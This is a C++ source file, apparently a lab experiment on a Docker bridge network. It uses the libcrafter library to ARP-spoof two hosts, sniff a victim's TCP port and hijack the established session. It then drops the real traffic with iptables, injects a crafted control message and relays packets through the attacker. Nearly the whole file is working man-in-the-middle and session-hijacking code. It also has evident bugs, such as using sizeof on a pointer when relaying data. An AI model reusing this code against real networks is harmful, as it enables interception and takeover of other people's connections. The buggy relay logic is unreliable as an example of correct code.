#include <crafter.h>
#include <crafter/Utils/TCPConnection.h>
#include <iostream>
#include <string>
#include <thread>

/* Collapse namespaces */
using namespace std;
using namespace Crafter;

/* Source port that we have to find out */
short_word srcport = 0;
std::vector<std::jthread> backend_thread;
enum opcode {
    MVVM_SOCK_SUSPEND = 0,
    MVVM_SOCK_SUSPEND_TCP_SERVER = 1,
    MVVM_SOCK_RESUME = 2,
    MVVM_SOCK_RESUME_TCP_SERVER = 3,
    MVVM_SOCK_INIT = 4,
    MVVM_SOCK_FIN = 5
};
struct mvvm_op_data {
    enum opcode op;
    bool is_tcp;
    int size;
};
void PacketHandler(Packet *sniff_packet, void *user) {

    /* Get the TCP layer from the packet */
    TCP *tcp_header = GetTCP(*sniff_packet);

    srcport = tcp_header->GetSrcPort();
}
void ip_forward() {
    system("/bin/echo 1 > /proc/sys/net/ipv4/ip_forward");
    system("/bin/echo 0 > /proc/sys/net/ipv4/conf/eth0/send_redirects");
    system("iptables --append FORWARD --in-interface eth0 --jump ACCEPT");
}

void start_block(const string &dst_ip, const string &src_ip, int dst_port, int src_port) {

    /* Delete the forwarding... */
    system("iptables --delete FORWARD --in-interface eth0 --jump ACCEPT");

    /* Drop packets received from the spoofed connection */
    system(string("/sbin/iptables -A FORWARD -s " + dst_ip + " -d " + src_ip + " -p tcp --sport " + StrPort(dst_port) +
                  " --dport " + StrPort(src_port) + " -j DROP")
               .c_str());

    system(string("/sbin/iptables -A FORWARD -s " + src_ip + " -d " + dst_ip + " -p tcp --sport " + StrPort(src_port) +
                  " --dport " + StrPort(dst_port) + " -j DROP")
               .c_str());

    /* Append again the forwarding, so the victim can establish a new connection... */
    system("iptables --append FORWARD --in-interface eth0 --jump ACCEPT");
}

void clear_block(const string &dst_ip, const string &src_ip, int dst_port, int src_port) {
    system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward");

    system(string("/sbin/iptables -D FORWARD -s " + dst_ip + " -d " + src_ip + " -p tcp --sport " + StrPort(dst_port) +
                  " --dport " + StrPort(src_port) + " -j DROP")
               .c_str());

    system(string("/sbin/iptables -D FORWARD -s " + src_ip + " -d " + dst_ip + " -p tcp --sport " + StrPort(src_port) +
                  " --dport " + StrPort(dst_port) + " -j DROP")
               .c_str());
}

void clear_forward() {
    system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward");
    system("iptables --delete FORWARD --in-interface eth0 --jump ACCEPT");
}
int main() {

    /* Set the interface */
    string iface = "docker0";

    ip_forward();

    /* Set connection data */
    string dst_ip = "172.17.0.2"; // <-- Destination IP
    string src_ip = "172.17.0.3"; // <-- Spoof IP
    short_word dstport = 1234; // <-- We know the spoofed IP connects to this port

    /* Begin the spoofing */
    ARPContext *arp_context = ARPSpoofingReply(dst_ip, src_ip, iface);

    /* Print some info */
    PrintARPContext(*arp_context);
    string filter = "tcp and host " + dst_ip + " and host " + src_ip;
    /* TCP stuff */
    filter += " and dst port " + StrPort(dstport);
    /* Launch the sniffer */
    Sniffer sniff(filter, iface, PacketHandler);
    sniff.Capture(1);
    cout << "[@] Detected a source port: " << srcport << endl;

    /* ------------------------------------- */

    /* TCP connection victim to server */
    auto tcp_v_to_s = new TCPConnection(src_ip, dst_ip, srcport, dstport, iface, TCPConnection::ESTABLISHED);
    /* TCP connection server to victim */
    auto tcp_s_to_v = new TCPConnection(dst_ip, src_ip, dstport, srcport, iface, TCPConnection::ESTABLISHED);
    /* Both connection are already established... */

    /* [+] Synchronize the ACK and SEQ numbers
     * This will block the program until some TCP packets from the spoofed connection
     * pass through your computer...
     */
    tcp_v_to_s->Sync();
    tcp_s_to_v->Sync();

    cout << "[@] Connections synchronized " << endl;

    /* Give all this a second... */
    // sleep(1);

    /* Start blocking the traffic of the spoofed connection */
    start_block(dst_ip, src_ip, dstport, srcport);

    /* Reset the connection to the victim */
    // tcp_s_to_v.Reset();
    // tcp_s_to_v.KeepAlive();

    auto op_data = (struct mvvm_op_data *)malloc(sizeof(struct mvvm_op_data));
    op_data->op = MVVM_SOCK_FIN;
    tcp_v_to_s->Send(((const byte_ *)op_data), sizeof(*op_data));
    backend_thread.clear();
    /* Close the spoofed connection with the server after we send our commands */
    tcp_v_to_s->Close();

    sleep(10);
    /* Clear everything */
    // new dest_ip;
    string dest_ip = "172.17.0.5";
    // new port
    // clear_block(dst_ip, src_ip, dstport, srcport);

    tcp_v_to_s = new TCPConnection(src_ip, dst_ip, srcport, dstport, iface, TCPConnection::ESTABLISHED);

    bool closed = false;
    backend_thread.emplace_back([&]() {
        while (!closed) {
            auto payload = Payload();
            tcp_v_to_s->Read(payload);
            if (tcp_v_to_s->GetStatus() == TCPConnection::CLOSING) {
                closed = true;
                return;
            }
            tcp_s_to_v->Send(payload.GetRawPointer(), sizeof(*payload.GetRawPointer()));
        }
    });
    backend_thread.emplace_back([&]() {
        while (!closed) {
            auto payload = Payload();
            tcp_s_to_v->Read(payload);
            if (tcp_s_to_v->GetStatus() == TCPConnection::CLOSING) {
                closed = true;
                return;
            }
            tcp_v_to_s->Send(payload.GetRawPointer(), sizeof(*payload.GetRawPointer()));
        }
    });
    clear_forward();
    CleanARPContext(arp_context);

    return 0;
}
